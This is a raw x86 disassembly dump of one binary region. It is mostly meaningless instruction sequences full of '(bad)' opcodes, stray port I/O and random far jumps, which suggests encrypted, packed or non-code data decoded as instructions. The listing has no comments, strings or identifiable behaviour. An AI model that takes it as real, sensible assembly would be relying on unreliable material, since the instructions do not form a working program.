  414abd:	mov    ebp,0xaa01be8e
  414ac2:	repnz (bad) 
  414ac4:	fbld   TBYTE PTR [ebp+0x58bdd9d0]
  414aca:	mov    al,0x8c
  414acc:	add    al,0x4
  414ace:	test   al,0x2f
  414ad0:	cmp    DWORD PTR [eax+0x1],0xffffffe1
  414ad4:	xchg   edx,eax
  414ad5:	aad    0x6f
  414ad7:	xchg   edx,eax
  414ad8:	aad    0x41
  414ada:	sbb    al,0x3f
  414adc:	fmul   DWORD PTR [ecx-0x20]
  414adf:	dec    esp
  414ae0:	cld    
  414ae1:	mov    WORD PTR [esi-0x26],ds
  414ae4:	mov    edx,0x3c348f4f
  414ae9:	xchg   edi,eax
  414aea:	fdivp  st(1),st
  414aec:	add    al,0x4b
	...
  414b56:	lahf   
  414b57:	fnstcw WORD PTR [esi]
  414b59:	ss jle 0x414b53
  414b5c:	lahf   
  414b5d:	stc    
  414b5e:	bound  esp,QWORD PTR [ebx+0x3a5b63d9]
  414b64:	test   BYTE PTR [edi+0xdf67],bl
  414b6a:	add    BYTE PTR [ecx],al
  414b6c:	add    BYTE PTR [eax],al
  414b6e:	pushf  
  414b6f:	not    DWORD PTR [edi-0x5c]
  414b72:	popa   
  414b73:	jl     0x414b67
  414b75:	(bad)  
  414b76:	xchg   ecx,eax
  414b77:	(bad)  
  414b78:	bound  eax,QWORD PTR [eax-0x78]
  414b7b:	inc    edi
  414b7c:	add    eax,0x96646120
  414b81:	push   ss
  414b82:	and    DWORD PTR [edi+0x16787f16],eax
  414b88:	pop    esp
  414b89:	inc    edi
  414b8a:	dec    edi
  414b8b:	in     eax,0x88
  414b8d:	aad    0x98
  414b8f:	xchg   ebx,eax
  414b90:	es sbb esi,ebp
  414b93:	mov    bh,BYTE PTR [ebp+edi*8-0x47]
  414b97:	dec    edi
  414b98:	fcmovnu st,st(0)
  414b9a:	pop    edx
  414b9b:	push   edi
  414b9c:	fsub   DWORD PTR [esp+eiz*8-0x40d547ff]
  414ba3:	mov    edx,DWORD PTR [edx+0x16d2d564]
  414ba9:	popa   
  414baa:	jne    0x414b59
  414bac:	ins    DWORD PTR es:[edi],dx
  414bad:	jmp    0x414bb5
  414baf:	fidiv  DWORD PTR ds:0xd2a73e55
  414bb5:	int3   
  414bb6:	jae    0x414c23
  414bb8:	fisttp QWORD PTR [esi+0x13]
  414bbb:	push   ss
  414bbc:	adc    DWORD PTR ds:0x10854944,ebx
  414bc2:	inc    eax
  414bc3:	inc    ecx
  414bc4:	ror    DWORD PTR [edx+0x32],0xf1
  414bc8:	out    0x44,eax
  414bca:	outs   dx,DWORD PTR ds:[esi]
  414bcb:	mov    ah,0xa0
  414bcd:	mov    WORD PTR [ebx+0x9],cs
  414bd0:	push   edi
  414bd1:	xor    al,BYTE PTR [eax]
  414bd3:	rcl    edx,1
  414bd5:	mov    esp,0x63d3891d
  414bda:	xchg   ebx,eax
  414bdb:	call   0xc8670b0c
  414be0:	jns    0x414c23
  414be2:	sub    BYTE PTR [esi-0x54],0x72
  414be6:	inc    ebx
  414be7:	push   ds
  414be8:	push   ss
  414be9:	and    BYTE PTR fs:0x45a5e02c,al
  414bf0:	adc    esp,esp
  414bf2:	cmp    eax,0x8dee1c87
  414bf7:	fild   WORD PTR [edx]
  414bf9:	imul   ebp,DWORD PTR [eax-0x1a],0xfffffff5
  414bfd:	mov    ecx,0xa3cd8399
  414c02:	push   esi
  414c03:	bound  ebp,QWORD PTR [edx+0x2af3ee15]
  414c09:	fldcw  WORD PTR [edx+0x45]
  414c0c:	or     eax,0xbfe3fe2e
  414c11:	pop    ebx
  414c12:	sar    DWORD PTR [ebx],1
  414c14:	aad    0x84
  414c16:	stos   BYTE PTR es:[edi],al
  414c17:	inc    esp
  414c18:	sub    al,0xd8
  414c1a:	sbb    eax,0xcc88eeb0
  414c1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c20:	imul   esi,esp,0x170d7faa
  414c26:	hlt    
  414c27:	lods   eax,DWORD PTR ds:[esi]
  414c28:	dec    BYTE PTR [eax]
  414c2a:	loope  0x414c29
  414c2c:	mov    dl,0xe0
  414c2e:	add    eax,0x6671996
  414c33:	cmp    ah,cl
  414c35:	jecxz  0x414bbd
  414c37:	adc    esp,DWORD PTR [eax+0x5f]
  414c3a:	out    dx,eax
  414c3b:	jle    0x414c96
  414c3d:	jno    0x414bc4
  414c3f:	and    eax,0xf16a2c9f
  414c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c45:	xchg   esi,eax
  414c46:	test   al,0xad
  414c48:	imul   BYTE PTR [ebx+0x3]
  414c4b:	add    bh,BYTE PTR [ecx]
  414c4d:	sub    DWORD PTR [eax+eax*8+0x1899886a],edx
  414c54:	std    
  414c55:	cmp    ch,dh
  414c57:	add    DWORD PTR [edx],ecx
  414c59:	cmp    DWORD PTR [edx+0x59],eax
  414c5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c5d:	leave  
  414c5e:	cmc    
  414c5f:	pop    edx
  414c60:	rcl    BYTE PTR [edx-0x51f8bcd9],1
  414c66:	push   ebx
  414c67:	retf   0x9205
  414c6a:	xor    eax,0x6806e9
	...
  414cd3:	add    BYTE PTR [eax],al
  414cd5:	add    BYTE PTR [esp+eiz*2],dh
  414cd8:	push   ds
  414cd9:	jl     0x414d39
  414cdb:	jle    0x414d53
  414cdd:	ins    BYTE PTR es:[edi],dx
  414cde:	out    0x12,al
  414ce0:	cs adc edx,esp
  414ce3:	mov    es,eax
  414ce5:	inc    ebx
  414ce6:	addr16 loopne 0x414ce9
  414ce9:	add    BYTE PTR [eax],al
  414ceb:	add    DWORD PTR [eax],eax
  414ced:	add    BYTE PTR [edi+0x6f],ch
  414cf0:	mov    edi,esp
  414cf2:	repnz and eax,0xe188eda6
  414cf8:	inc    eax
  414cf9:	add    esp,ecx
  414cfb:	sub    ebp,DWORD PTR [ebx-0x4c881949]
  414d01:	cmp    al,0x44
  414d03:	in     eax,0x2f
  414d05:	rcr    esi,cl
  414d07:	xchg   BYTE PTR ds:0x2097bcca,bh
  414d0d:	sub    DWORD PTR [ebx-0x7a411d88],ebp
  414d13:	jg     0x414cb0
  414d15:	dec    esi
  414d16:	scas   al,BYTE PTR es:[edi]
  414d17:	loope  0x414d4a
  414d19:	inc    esi
  414d1a:	stos   BYTE PTR es:[edi],al
  414d1b:	cmp    eax,DWORD PTR [ecx]
  414d1d:	mov    BYTE PTR [edi],ah
  414d1f:	clc    
  414d20:	(bad)  
  414d21:	cld    
  414d22:	sub    ch,BYTE PTR [eax-0x3b62d7af]
  414d28:	aas    
  414d29:	xor    DWORD PTR [ecx+0x50c0f78],edi
  414d2f:	cld    
  414d30:	mov    ah,bh
  414d32:	in     al,0x8a
  414d34:	sbb    eax,0x6b515dc6
  414d39:	inc    esp
  414d3a:	sbb    al,0x4f
  414d3c:	pop    ebp
  414d3d:	sahf   
  414d3e:	pop    ss
  414d3f:	in     al,0x89
  414d41:	sbb    eax,0xfaad587e
  414d46:	push   ds
  414d47:	mov    edx,0x8c621fd7
  414d4c:	sub    DWORD PTR [ebx+0x738d9be6],esp
  414d52:	mov    es:0x8d37e277,eax
  414d58:	xchg   ebp,eax
  414d59:	sbb    al,0x57
  414d5b:	leave  
  414d5c:	les    ebx,FWORD PTR [ecx+ecx*2-0x59b08900]
  414d63:	das    
  414d64:	daa    
  414d65:	shl    BYTE PTR [edx-0x2f],0x74
  414d69:	(bad)
  414d6d:	mov    BYTE PTR ds:[ebp-0x1f],bl
  414d71:	dec    edx
  414d72:	xchg   ecx,eax
  414d73:	inc    eax
  414d74:	outs   dx,BYTE PTR ds:[esi]
  414d75:	cmp    eax,0xe8fc6442
  414d7a:	sbb    al,0x8d
  414d7c:	push   ecx
  414d7d:	into   
  414d7e:	pop    ecx
  414d7f:	adc    cl,BYTE PTR [edi-0x7e]
  414d82:	lahf   
  414d83:	sub    dh,ah
  414d85:	nop
  414d86:	dec    esi
  414d87:	mov    ebx,0xe9a905f3
  414d8c:	xchg   ebx,eax
  414d8d:	ret    0xd02c
  414d90:	push   0x29
  414d92:	arpl   WORD PTR [edx+0x20],dx
  414d95:	cli    
  414d96:	xor    BYTE PTR es:[edi],bh
  414d99:	jmp    DWORD PTR [eax+0x714ee45]
  414d9f:	sbb    bh,BYTE PTR [esi+ecx*8+0x76fd0de0]
  414da6:	add    DWORD PTR [ebp+0xbcbf81],0x2d
  414dad:	fcomp  QWORD PTR [esi]
  414daf:	jp     0x414d76
  414db1:	push   edi
  414db2:	scas   al,BYTE PTR es:[edi]
  414db3:	loope  0x414de0
  414db5:	add    eax,DWORD PTR [edx+0x5db6c1d7]
  414dbb:	idiv   DWORD PTR [edi+0x2b]
  414dbe:	xor    eax,0x2d268656
  414dc3:	or     BYTE PTR [ebx+ebx*4-0x444ed2de],ch
  414dca:	push   es
  414dcb:	out    0x27,al
  414dcd:	ja     0x414d6e
  414dcf:	mov    eax,0xc3adf8c7
  414dd4:	shl    DWORD PTR [eax],cl
  414dd6:	push   ecx
  414dd7:	fistp  DWORD PTR [ebp+ebx*8-0x36]
  414ddb:	pop    edx
  414ddc:	iret   
  414ddd:	adc    DWORD PTR [edi],0x29
  414de0:	(bad)  
  414de1:	hlt    
  414de2:	repnz scas al,BYTE PTR es:[edi]
  414de4:	and    DWORD PTR [eax],edx
  414de6:	jbe    0x414d95
  414de8:	cmp    eax,0x2ed192bc
  414ded:	cmp    al,BYTE PTR [eax]
	...
  414e53:	add    BYTE PTR [eax],al
  414e55:	add    BYTE PTR [edi+0x3e911299],dh
  414e5b:	fwait
  414e5c:	mov    bh,0xbf
  414e5e:	in     al,dx
  414e5f:	xor    dh,BYTE PTR [esi]
  414e61:	adc    eax,0x259bfe20
  414e66:	addr16 loope 0x414e69
  414e69:	add    BYTE PTR [eax],al
  414e6b:	add    DWORD PTR [eax],eax
  414e6d:	add    BYTE PTR [esi+0x30525d8],ch
  414e73:	xor    ebx,DWORD PTR [edx]
  414e75:	mov    bh,0x32
  414e77:	mov    ebp,0x4d833740
  414e7c:	(bad)  
  414e7d:	stc    
  414e7e:	call   0x7578:0x70611088
  414e85:	ret    0x1856
  414e88:	mov    eax,0x1ac45860
  414e8d:	jecxz  0x414e4a
  414e8f:	pop    esp
  414e90:	add    al,0x7a
  414e92:	jb     0x414e34
  414e94:	sub    ch,dh
  414e96:	sbb    BYTE PTR [eax-0x7b],0x8e
  414e9a:	mov    esp,0x9eda3156
  414e9f:	ja     0x414ee5
  414ea1:	and    DWORD PTR ds:0x6362411a,eax
  414ea7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ea8:	icebp  
  414ea9:	(bad)  
  414eaa:	out    dx,eax
  414eab:	mov    edi,0x5881d69
  414eb0:	outs   dx,DWORD PTR ds:[esi]
  414eb1:	cmp    edi,esp
  414eb3:	jae    0x414e9b
  414eb5:	jnp    0x414f0b
  414eb7:	sub    al,bl
  414eb9:	dec    edi
  414eba:	inc    ebx
  414ebb:	aad    0x70
  414ebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ebe:	scas   al,BYTE PTR es:[edi]
  414ebf:	pop    ds
  414ec0:	and    ebp,DWORD PTR [ebx-0x1a]
  414ec3:	pop    ebx
  414ec4:	sbb    eax,0xb61faccc
  414ec9:	pop    eax
  414eca:	retf   0xd642
  414ecd:	out    dx,eax
  414ece:	sub    DWORD PTR [esi+0x64],esi
  414ed1:	sub    al,0x2d
  414ed3:	rcl    BYTE PTR [esi],cl
  414ed5:	push   0xb8b17bcd
  414eda:	push   0xfffffff1
  414edc:	rcr    DWORD PTR [ebx-0x13],cl
  414edf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ee0:	mov    cl,0x4b
  414ee2:	ins    DWORD PTR es:[edi],dx
  414ee3:	jp     0x414ee8
  414ee5:	aad    0x77
  414ee7:	xchg   ebp,eax
  414ee8:	repz xor edi,DWORD PTR [ebx+esi*1]
  414eec:	aas    
  414eed:	push   eax
  414eee:	jbe    0x414f08
  414ef0:	xchg   edi,eax
  414ef1:	jo     0x414f5b
  414ef3:	add    eax,0xe44e1607
  414ef8:	(bad)  [ecx]
  414efa:	cmp    eax,0x1d88172e
  414eff:	xchg   edi,eax
  414f00:	add    eax,0x58384383
  414f05:	jp     0x414ebd
  414f07:	rcr    BYTE PTR [ecx-0x1d],cl
  414f0a:	out    0x72,al
  414f0c:	and    ch,BYTE PTR [eax-0x41]
  414f0f:	icebp  
  414f10:	mov    eax,ds:0x5a72e3ac
  414f15:	adc    eax,0xc0bbe221
  414f1a:	mov    dl,0x11
  414f1d:	fst    QWORD PTR [ebx]
  414f1f:	and    BYTE PTR [ebx-0x1ec9c77],bl
  414f25:	test   eax,0x300b71fb
  414f2a:	fisubr WORD PTR [edx-0x35]
  414f2d:	xchg   dl,bh
  414f2f:	(bad)  
  414f30:	fwait
  414f31:	push   edx
  414f32:	stos   BYTE PTR es:[edi],al
  414f33:	ins    BYTE PTR es:[edi],dx
  414f34:	int    0x66
  414f36:	xchg   edi,eax
  414f37:	jp     0x414f04
  414f39:	(bad)  
  414f3a:	clc    
  414f3b:	fimul  WORD PTR [eax-0x18d4f078]
  414f41:	add    DWORD PTR ss:[ecx+0x6dc21d21],ecx
  414f48:	data16 jno 0x414fc4
  414f4b:	test   eax,0x116ad6ff
  414f50:	pop    ds
  414f51:	jp     0x414f13
  414f53:	iret   
  414f54:	pop    DWORD PTR [eax+eiz*2]
  414f57:	rol    DWORD PTR [ecx+0x1c],0x1e
  414f5b:	xchg   ecx,eax
  414f5c:	push   es
  414f5d:	aam    0xe9
  414f5f:	fsubrp st(2),st
  414f61:	xor    ecx,eax
  414f63:	neg    ebp
  414f65:	sub    esp,edx
  414f67:	clc    
  414f68:	cmp    ebx,edi
  414f6a:	int    0xd8
  414f6c:	xor    ch,BYTE PTR [ecx+0x0]
	...
  414fd3:	add    BYTE PTR [eax],al
  414fd5:	add    BYTE PTR [edi],dh
  414fd7:	data16 xor al,0x9b
  414fda:	jne    0x414fb7
  414fdc:	mov    edi,0xe45ae5ee
  414fe1:	call   0xe267:0xa2a93db1
  414fe8:	add    BYTE PTR [eax],al
  414fea:	add    BYTE PTR [ecx],al
  414fec:	add    BYTE PTR [eax],al
  414fee:	es add al,0xad
  414ff1:	fcmovne st,st(6)
  414ff3:	add    al,0x24
  414ff5:	test   BYTE PTR [ebx+0x5bbadd4],bl
  414ffb:	mov    eax,ds:0x60592703
  415000:	mov    esi,0x87fedb06
  415005:	or     ebx,DWORD PTR [ecx-0x3aac3358]
  41500b:	sub    eax,0xbf31363d
  415010:	cmp    BYTE PTR [esi-0x19f668a9],bl
  415016:	push   edi
  415017:	xor    BYTE PTR [ebp-0x23],al
  41501a:	jae    0x414fb8
  41501c:	pop    esi
  41501d:	test   ebp,eax
  41501f:	cli    
  415020:	pop    ds
  415021:	test   DWORD PTR [edx],0x1d21ae11
  415027:	or     al,BYTE PTR [edx]
  415029:	pop    ss
  41502a:	and    edi,DWORD PTR ds:0x5805925b
  415030:	rol    DWORD PTR [ebx+0x31],1
  415033:	dec    eax
  415034:	dec    ebx
  415035:	xor    eax,0x4b7ee29f
  41503a:	lahf   
  41503b:	mov    esi,ebp
  41503d:	std    
  41503e:	aaa    
  41503f:	sbb    ch,BYTE PTR [esi-0x22]
  415042:	test   eax,0x4d56c00e
  415047:	push   ecx
  415048:	pop    edi
  415049:	mov    ebx,0xee69859c
  41504e:	xchg   esi,eax
  41504f:	ds popf 
  415051:	adc    ecx,DWORD PTR [edi-0x5f55c8cd]
  415057:	xor    ah,BYTE PTR [ecx-0x662eb0b4]
  41505d:	call   0x678fa7e4
  415062:	sbb    BYTE PTR [eax],bh
  415064:	mov    bh,0x49
  415066:	in     al,0xd3
  415068:	and    BYTE PTR [edi],bh
  41506a:	scas   al,BYTE PTR es:[edi]
  41506b:	push   es
  41506c:	aam    0xce
  41506e:	sub    ebp,ebp
  415070:	ss cmp bh,dl
  415073:	mov    bl,bl
  415075:	mov    ah,0xed
  415077:	mov    ?,edi
  415079:	inc    ecx
  41507a:	adc    DWORD PTR [edi],ecx
  41507c:	aas    
  41507d:	push   es
  41507e:	and    edx,DWORD PTR [esi+0x54]
  415081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415082:	out    dx,eax
  415083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415084:	int    0x29
  415086:	aaa    
  415087:	sbb    bh,cl
  415089:	(bad)  
  41508a:	imul   BYTE PTR [edi+0x50]
  41508d:	std    
  41508e:	fdivr  QWORD PTR [esi]
  415090:	adc    BYTE PTR [ecx-0x1],ch
  415093:	inc    esp
  415094:	sbb    al,0xa2
  415096:	sbb    dl,dh
  415098:	mov    eax,0xeabad32c
  41509d:	dec    ecx
  41509e:	in     eax,dx
  41509f:	scas   al,BYTE PTR es:[edi]
  4150a0:	mov    ds:0xbf7ffc60,al
  4150a5:	cmp    bh,dl
  4150a7:	rcr    bh,0x61
  4150aa:	mov    ebx,0xf08b50e2
  4150af:	jecxz  0x41507b
  4150b1:	lock push edi
  4150b3:	fidivr WORD PTR [edi+0x444d0c08]
  4150b9:	pop    eax
  4150ba:	or     ebx,ecx
  4150bc:	jb     0x4150af
  4150be:	inc    ebx
  4150bf:	dec    ecx
  4150c0:	or     al,BYTE PTR [ecx-0xce6148d]
  4150c6:	dec    eax
  4150c7:	xchg   edi,eax
  4150c8:	aam    0x57
  4150ca:	inc    eax
  4150cb:	sahf   
  4150cc:	aaa    
  4150cd:	popa   
  4150ce:	mov    eax,ds:0xe95db966
  4150d3:	mov    ecx,DWORD PTR [eax-0x11]
  4150d6:	pop    eax
  4150d7:	mov    dl,BYTE PTR [ecx]
  4150d9:	push   ecx
  4150da:	call   0x658aefec
  4150df:	jb     0x415092
  4150e1:	scas   al,BYTE PTR es:[edi]
  4150e2:	xor    ch,BYTE PTR ds:0x6bdeac88
  4150e8:	xor    esp,ebx
  4150ea:	mov    eax,0xaaa3ad
	...
  415153:	add    BYTE PTR [eax],al
  415155:	add    BYTE PTR [ebx+0x2],bh
  415158:	add    ebp,ebx
  41515a:	jnp    0x415147
  41515c:	sti    
  41515d:	xchg   edx,eax
  41515e:	lahf   
  41515f:	mov    esi,0xa566fc2d
  415164:	or     ebx,DWORD PTR [edi+0xe367]
  41516a:	add    BYTE PTR [ecx],al
  41516c:	add    BYTE PTR [eax],al
  41516e:	nop
  41516f:	jg     0x415192
  415171:	xor    edi,0x54bd1001
  415177:	fsubp  st(6),st
  415179:	ror    DWORD PTR fs:[esi-0x6c],cl
  41517d:	adc    DWORD PTR [ebp+0x5e],0xc05e5a2b
  415184:	mov    edx,0x5ca463b5
  415189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41518a:	out    0x5e,eax
  41518c:	(bad)  
  41518d:	mov    eax,ds:0xd8763ca3
  415192:	pop    ecx
  415193:	cdq    
  415194:	push   0x1b
  415196:	sti    
  415197:	push   cs
  415198:	xor    bh,0x76
  41519b:	mov    ch,0xd2
  41519d:	mov    edx,0x4ce22e35
  4151a2:	push   ss
  4151a3:	adc    eax,0x3e0269ed
  4151a8:	and    eax,0x51706d61
  4151ad:	or     ch,dh
  4151af:	loopne 0x4151b9
  4151b1:	ret    
  4151b2:	pminub mm3,QWORD PTR [ecx+0x2d]
  4151b6:	push   esp
  4151b7:	adc    BYTE PTR [edx+eax*8],ah
  4151ba:	adc    BYTE PTR [eax-0x59],0xf1
  4151be:	mov    BYTE PTR [ebx-0x6ea60d31],dh
  4151c4:	mov    dh,0x88
  4151c6:	push   ds
  4151c7:	hlt    
  4151c8:	add    dl,0x5b
  4151cb:	push   ecx
  4151cc:	jmp    0x41524d
  4151ce:	lods   al,BYTE PTR ds:[esi]
  4151cf:	call   0x4c40:0x94f1d7cb
  4151d6:	pop    ebp
  4151d7:	mov    edx,0x36316d41
  4151dc:	dec    eax
  4151dd:	repnz adc DWORD PTR [ebx+0x2f4bc2d6],edi
  4151e4:	pop    ebx
  4151e5:	into   
  4151e6:	dec    esp
  4151e7:	addr16 jo 0x4151b6
  4151ea:	stos   DWORD PTR es:[edi],eax
  4151eb:	outs   dx,BYTE PTR ds:[esi]
  4151ec:	cmp    DWORD PTR [ecx+0x524805ba],esp
  4151f2:	pop    ss
  4151f3:	cmp    DWORD PTR [ebp+0x42640282],edx
  4151f9:	fstp   TBYTE PTR [ecx+0x64be99c]
  4151ff:	cmp    eax,0x58a24e31
  415204:	ret    0x76f8
  415207:	push   esp
  415208:	push   ebx
  415209:	paddsb mm6,QWORD PTR [edi+0x8]
  41520d:	and    al,0xe3
  41520f:	js     0x4151ad
  415211:	les    edi,FWORD PTR [edi+0x634a6d16]
  415217:	call   0x84f7:0x4fcc6012
  41521e:	outs   dx,BYTE PTR ds:[esi]
  41521f:	test   al,0x9b
  415221:	out    0xd4,al
  415223:	or     al,0xf2
  415225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415226:	int    0xb7
  415228:	ret    
  415229:	xchg   ecx,eax
  41522a:	frstor [esi+0x3]
  41522d:	dec    esi
  41522e:	jnp    0x415266
  415230:	fst    DWORD PTR [ebx+ebx*8-0x77abeea0]
  415237:	mov    edi,0xeaa49241
  41523c:	test   BYTE PTR [edx+0x42b32d31],0xaf
  415243:	repnz push ds
  415245:	sar    BYTE PTR [ebx],cl
  415247:	jbe    0x41524f
  415249:	push   es
  41524a:	push   esp
  41524b:	ins    DWORD PTR es:[edi],dx
  41524c:	hlt    
  41524d:	mov    edi,cs
  41524f:	clc    
  415250:	sar    BYTE PTR [esi],0x80
  415253:	push   eax
  415254:	add    dl,0xf
  415257:	fsub   QWORD PTR [eax]
  415259:	push   esp
  41525a:	lds    ecx,FWORD PTR [edx-0x66117c4a]
  415260:	dec    ebp
  415261:	mov    dl,0xb5
  415263:	inc    ebx
  415264:	cli    
  415265:	ror    BYTE PTR [edx+0x8647d35],cl
  41526b:	and    eax,0x3456
	...
  4152d4:	add    BYTE PTR [eax],al
  4152d6:	sub    al,0x97
  4152d8:	pop    ds
  4152d9:	sar    DWORD PTR [edi-0x6001127],1
  4152df:	(bad)  
  4152e0:	mov    ecx,0xd19e820b
  4152e5:	pop    eax
  4152e6:	addr16 in al,0x0
  4152e9:	add    BYTE PTR [eax],al
  4152eb:	add    DWORD PTR [eax],eax
  4152ed:	add    BYTE PTR [edx+edi*1],dh
  4152f0:	test   eax,0xe39c44c5
  4152f5:	push   ebp
  4152f6:	dec    eax
  4152f7:	outs   dx,BYTE PTR ds:[esi]
  4152f8:	xchg   ecx,eax
  4152f9:	ins    DWORD PTR es:[edi],dx
  4152fa:	jnp    0x4152e9
  4152fc:	mov    al,0xb2
  4152fe:	pop    eax
  4152ff:	adc    DWORD PTR [eax],ebp
  415301:	inc    edi
  415302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415303:	sub    al,BYTE PTR [edx+eax*2-0x8885900]
  41530a:	ja     0x41535b
  41530c:	jne    0x415321
  41530e:	xor    BYTE PTR [ebp+0x45],dh
  415311:	fild   DWORD PTR [esi+0x6c0d7375]
  415317:	scas   al,BYTE PTR es:[edi]
  415318:	mov    bh,0x32
  41531a:	(bad)  
  41531d:	xchg   ebp,eax
  41531e:	adc    BYTE PTR [ecx],bl
  415320:	stc    
  415321:	sub    al,0xd
  415323:	mov    eax,0x22a2be8c
  415328:	test   BYTE PTR [edx],bh
  41532a:	cmp    BYTE PTR [ecx+0x2d],bl
  41532d:	es aaa 
  41532f:	jge    0x41539e
  415331:	jle    0x41535f
  415333:	std    
  415334:	add    eax,0x7d984d09
  415339:	loope  0x41539e
  41533b:	pop    ecx
  41533c:	dec    ebx
  41533d:	out    0xa4,eax
  41533f:	test   DWORD PTR [esp+eiz*4+0x33],ebp
  415343:	inc    ecx
  415344:	push   0x1f
  415346:	mov    ds:0x25a3454c,al
  41534b:	mov    esp,0xad4e666e
  415350:	mov    cl,0x94
  415352:	jae    0x4153ce
  415354:	inc    esi
  415355:	in     eax,0x8
  415357:	rol    DWORD PTR [edi],0x8a
  41535a:	ins    BYTE PTR es:[edi],dx
  41535b:	in     al,0x1e
  41535d:	mov    esp,DWORD PTR [edx+ebp*8]
  415360:	dec    ecx
  415361:	test   eax,0xc0f99996
  415366:	sbb    eax,0x70b0be8f
  41536b:	and    al,0x7
  41536d:	fstp   TBYTE PTR [edx]
  41536f:	loop   0x4153e7
  415371:	cdq    
  415372:	jl     0x41537e
  415374:	arpl   WORD PTR [edx],cx
  415376:	push   cs
  415377:	std    
  415378:	mov    dh,dl
  41537a:	jmp    0x4153cf
  41537c:	jmp    FWORD PTR [edx]
  41537e:	adc    eax,DWORD PTR [eax-0x5e8592e2]
  415384:	(bad)  
  415385:	adc    ebx,DWORD PTR [eax+0x7812d0e5]
  41538b:	sbb    esp,0xb601fccc
  415391:	inc    edi
  415392:	sbb    eax,0x8a6f5214
  415397:	loopne 0x415400
  415399:	std    
  41539a:	jge    0x4153eb
  41539c:	sub    al,0x1a
  41539e:	cmp    BYTE PTR [ebp-0x3e17b212],bh
  4153a4:	mov    al,0x37
  4153a6:	test   eax,0x726d5ceb
  4153ab:	pop    es
  4153ac:	push   ecx
  4153ad:	pop    eax
  4153ae:	lds    ecx,FWORD PTR ds:0x4c40f29
  4153b4:	and    eax,0x3b2fbb4
  4153b9:	jne    0x4153a9
  4153bb:	fisubr DWORD PTR [ecx-0x32f2ccc6]
  4153c1:	ret    0x287c
  4153c4:	mov    cs,WORD PTR [eax-0x60]
  4153c7:	push   esp
  4153c8:	arpl   WORD PTR ds:[edi-0x3ff60e71],cx
  4153cf:	out    dx,al
  4153d0:	pop    eax
  4153d1:	iret   
  4153d2:	adc    edi,DWORD PTR [ecx+eax*8]
  4153d5:	and    DWORD PTR [ebp-0x25],edx
  4153d8:	repnz stos BYTE PTR es:[edi],al
  4153da:	and    ebx,DWORD PTR [ebp+eiz*2-0x3b]
  4153de:	pop    esi
  4153df:	cdq    
  4153e0:	nop
  4153e1:	into   
  4153e2:	enter  0x551,0x6b
  4153e6:	in     al,0x2c
  4153e8:	(bad)  
  4153e9:	mov    ds:0x2dc5a52,al
	...
  415456:	ins    DWORD PTR es:[edi],dx
  415457:	lock repz jmp FWORD PTR cs:[edi]
  41545c:	std    
  41545d:	repz mov edi,0x48d3e5b0
  415463:	pusha  
  415464:	or     dl,BYTE PTR [ecx]
  415466:	addr16 in eax,0x0
  415469:	add    BYTE PTR [eax],al
  41546b:	add    DWORD PTR [eax],eax
  41546d:	add    BYTE PTR [edi-0x3a],ch
  415470:	ret    0x255c
  415473:	dec    edx
  415474:	jne    0x415489
  415476:	mov    BYTE PTR [eax+0x4],dh
  415479:	or     BYTE PTR [ebx],bl
  41547b:	int    0x4d
  41547d:	or     DWORD PTR [edi-0x455ded59],eax
  415483:	jno    0x4154cb
  415485:	xlat   BYTE PTR ds:[ebx]
  415486:	ror    DWORD PTR [edx-0x3adf748f],1
  41548c:	add    eax,0x5a6f5acb
  415491:	jmp    0x415481
  415493:	xor    DWORD PTR [esi+0x5f],ebx
  415496:	mov    esi,0xe2b46d34
  41549b:	or     eax,ebx
  41549d:	adc    esi,edx
  41549f:	sub    ecx,DWORD PTR [edx-0x6850b049]
  4154a5:	pop    ds
  4154a6:	fwait
  4154a7:	test   al,0x4f
  4154a9:	add    DWORD PTR [edi],esp
  4154ab:	mov    edi,0xe877f843
  4154b0:	aaa    
  4154b1:	jb     0x415498
  4154b3:	arpl   cx,ax
  4154b5:	(bad)
  4154b8:	in     al,0x46
  4154ba:	jmp    FWORD PTR [edx+0xd]
  4154bd:	bndstx [esi-0x47],(bad)
  4154c1:	stos   DWORD PTR es:[edi],eax
  4154c2:	(bad)  
  4154c3:	int    0xc3
  4154c5:	mov    al,ds:0x7672beed
  4154ca:	(bad)  
  4154cc:	stos   BYTE PTR es:[edi],al
  4154cd:	dec    ecx
  4154ce:	pop    bp
  4154d0:	jmp    0xa826:0x4705c45b
  4154d7:	mov    ebx,0xf1acd11a
  4154dc:	mov    al,ds:0x61b758ac
  4154e1:	push   ss
  4154e2:	imul   esp,esp,0xc406900e
  4154e8:	ins    DWORD PTR es:[edi],dx
  4154e9:	mov    BYTE PTR [esi+0x762a88a6],dl
  4154ef:	sub    al,0xcb
  4154f1:	push   ebx
  4154f2:	aam    0x5a
  4154f4:	les    edi,FWORD PTR [esi]
  4154f6:	mov    dh,0x7d
  4154f8:	xchg   cl,al
  4154fa:	dec    ebp
  4154fb:	into   
  4154fc:	pop    eax
  4154fd:	arpl   WORD PTR [edi+0x2d3eef66],dx
  415503:	test   BYTE PTR [edx-0x74bf189f],0xbf
  41550a:	xchg   esi,eax
  41550b:	mov    bl,0xb1
  41550d:	dec    DWORD PTR [esi+0x77]
  415510:	mov    edi,0x2539a75a
  415515:	push   ss
  415516:	sub    al,0x90
  415518:	ja     0x415582
  41551a:	dec    edi
  41551b:	jg     0x415517
  41551d:	inc    ebx
  41551e:	push   0xfffffff4
  415520:	das    
  415521:	xor    eax,0x71da9059
  415526:	inc    esp
  415527:	imul   ebx,DWORD PTR [esp+eax*2+0x26d172a0],0xbc13906c
  415532:	sbb    DWORD PTR [edi],esp
  415534:	rcl    DWORD PTR [ebp-0x30],1
  415537:	cdq    
  415538:	(bad)  
  415539:	addr16 push esi
  41553b:	jno    0x41551b
  41553d:	adc    ah,BYTE PTR [ebx-0x58]
  415540:	add    ah,BYTE PTR [ecx]
  415542:	adc    al,0x6a
  415544:	lds    esi,FWORD PTR [edi-0x6d]
  415547:	popf   
  415548:	adc    eax,0xe9b0c23e
  41554d:	mov    al,ds:0x9836ee75
